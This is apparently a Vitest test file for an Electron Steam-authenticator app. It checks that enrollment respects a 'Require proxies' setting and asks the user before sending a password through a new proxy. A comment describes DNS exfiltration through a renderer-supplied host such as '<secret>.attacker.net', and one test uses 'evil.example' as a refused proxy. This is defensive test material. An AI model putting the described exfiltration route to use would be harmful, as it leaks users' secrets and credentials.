import { beforeEach, describe, expect, it, vi } from 'vitest';
import { CHANNELS } from '../src/shared/channels';

const handlers = new Map<
	string,
	(event: { senderFrame: { url: string } }, request: unknown) => unknown
>();

vi.mock('electron', () => ({
	ipcMain: {
		handle: (
			channel: string,
			handler: (event: { senderFrame: { url: string } }, request: unknown) => unknown
		) => handlers.set(channel, handler),
		removeHandler: (channel: string): boolean => handlers.delete(channel)
	},
	dialog: { showSaveDialog: () => Promise.resolve({ canceled: true }) },
	BrowserWindow: { getFocusedWindow: () => undefined, getAllWindows: () => [] }
}));

import { registerEnrollmentHandlers } from '../src/main/steam/enrollment-ipc';
import { setTrustedSender, __resetRouterForTests } from '../src/main/ipc/router';
import type { EnrollmentService } from '../src/main/steam/enrollment';
import type { VaultService } from '../src/main/vault/service';
import { ProxyConsent, type ProxyConsentRequest } from '../src/main/net/proxy-consent';

/**
 * **Enrolling a new authenticator sends a password to Steam, and had no guard.**
 *
 * `Require proxies` is enforced at `SteamTransportFactory.forAccount`, which
 * every Steam request crosses — except the ones that never build a transport.
 * `steam-session` speaks over Node's own HTTP stack, so this call went out from
 * the machine's own address on a vault whose owner had said that must not
 * happen, and answered `{ state: 'needsEmailCode' }` as though it had worked.
 *
 * There is no stored account to read a proxy from: this is the call that
 * creates one. The field on the form is the only route there is, and empty
 * means refused — an account enrolled from the user's own address has already
 * told Steam the thing the proxy existed to hide.
 */

function harness(requireProxies: boolean, options: { approve?: boolean } = {}) {
	const begin = vi.fn().mockResolvedValue({ state: 'needsEmailCode' });
	const vault = {
		isUnlocked: () => true,
		touch: () => undefined,
		settings: () => ({ requireProxies }),
		read: () => ({ accounts: [] })
	} as unknown as VaultService;

	/*
	 * **The destination gate, which this path also crosses.** The renderer names
	 * the host, so a proxy on this call is always an address the vault has never
	 * seen — and this is the call that sends a password down it. Approving is the
	 * default here so the existing cases still describe the policy they were
	 * written for; the refusal has its own describe below.
	 */
	const asked: ProxyConsentRequest[] = [];
	const proxyConsent = new ProxyConsent({
		ask: (request) => {
			asked.push(request);
			return Promise.resolve(options.approve ?? true);
		}
	});

	registerEnrollmentHandlers(
		{ begin } as unknown as EnrollmentService,
		vault,
		{ show: () => Promise.resolve(undefined) },
		undefined,
		undefined,
		proxyConsent
	);
	return { begin, asked };
}

function enrol(request: Record<string, unknown>): Promise<unknown> {
	const handler = handlers.get(CHANNELS.enrollBegin);
	if (!handler) {
		throw new Error('enroll:begin was never registered');
	}
	return Promise.resolve(
		handler({ senderFrame: { url: 'file:///app/out/renderer/index.html' } }, request)
	);
}

beforeEach(() => {
	__resetRouterForTests();
	handlers.clear();
	setTrustedSender(() => true);
});

describe('enrolling under Require proxies', () => {
	it('refuses when no proxy was given', async () => {
		const { begin } = harness(true);

		await expect(enrol({ accountName: 'alice', password: 'secret' })).rejects.toThrow(
			/require proxies/i
		);

		expect(begin, 'the password went to Steam anyway').not.toHaveBeenCalled();
	});

	/*
	 * How a cleared field arrives from the form, and not the same value as
	 * "absent" to a check written the obvious way.
	 */
	it('refuses an empty proxy field', async () => {
		const { begin } = harness(true);
		await expect(enrol({ accountName: 'alice', password: 'secret', proxyUrl: '' })).rejects.toThrow(
			/require proxies/i
		);
		expect(begin).not.toHaveBeenCalled();
	});

	it('allows one that names a proxy', async () => {
		const { begin } = harness(true);
		await enrol({ accountName: 'alice', password: 'secret', proxyUrl: 'http://10.0.0.9:8080' });
		expect(begin).toHaveBeenCalledWith('alice', 'secret', 'http://10.0.0.9:8080');
	});

	it('changes nothing when the setting is off', async () => {
		const { begin } = harness(false);
		await enrol({ accountName: 'alice', password: 'secret' });
		expect(begin).toHaveBeenCalledWith('alice', 'secret', undefined);
	});

	it('says what to do about it', async () => {
		const { begin } = harness(true);
		await expect(enrol({ accountName: 'alice', password: 'secret' })).rejects.toThrow(/Settings/);
		expect(begin).not.toHaveBeenCalled();
	});
});

/**
 * **The renderer names this host, and nothing else checks it.**
 *
 * `planProxy` validates the scheme, the port and the credentials, never the
 * hostname — so a compromised renderer calls this channel with
 * `http://<secret>.attacker.net` and the main process resolves it, handing the
 * label to whoever runs that zone. The connection does not have to succeed;
 * DNS alone carries it. `docs/THREAT_MODEL.md` says a renderer compromise
 * cannot exfiltrate, and this was the counter-example.
 *
 * On this path there is no stored account to compare against — the call creates
 * one — so every proxy here is a new destination, and this one sends a password
 * down it.
 */
describe('a proxy destination the user has not approved', () => {
	it('is put to the user before the password goes anywhere', async () => {
		const { begin, asked } = harness(false);
		await enrol({ accountName: 'alice', password: 'secret', proxyUrl: 'http://10.0.0.9:8080' });

		expect(asked, 'the destination was used without anyone being asked').toHaveLength(1);
		expect(asked[0]?.endpoint).toBe('10.0.0.9:8080');
		expect(asked[0]?.accountName, 'the dialog cannot say whose traffic this is').toBe('alice');
		expect(asked[0]?.reason, 'the dialog would not mention the password').toBe('signIn');
		expect(begin).toHaveBeenCalled();
	});

	it('stops the sign-in when the answer is no', async () => {
		const { begin } = harness(false, { approve: false });
		await expect(
			enrol({ accountName: 'alice', password: 'secret', proxyUrl: 'http://evil.example:8080' })
		).rejects.toThrow(/not approved/);
		expect(
			begin,
			'a refused destination still received the password and the Steam request'
		).not.toHaveBeenCalled();
	});

	it('asks once, not on every attempt', async () => {
		const { asked } = harness(false);
		const proxyUrl = 'http://10.0.0.9:8080';
		await enrol({ accountName: 'alice', password: 'secret', proxyUrl });
		await enrol({ accountName: 'alice', password: 'secret', proxyUrl });

		// A prompt with no decision left in it is how people learn to click Allow.
		expect(asked, 'the same approved destination asked twice').toHaveLength(1);
	});

	/*
	 * Nothing is asked when there is no proxy: the traffic goes from this
	 * machine's own address, which is not a destination anyone chose.
	 */
	it('asks nothing when no proxy is named', async () => {
		const { asked } = harness(false);
		await enrol({ accountName: 'alice', password: 'secret' });
		expect(asked).toEqual([]);
	});
});
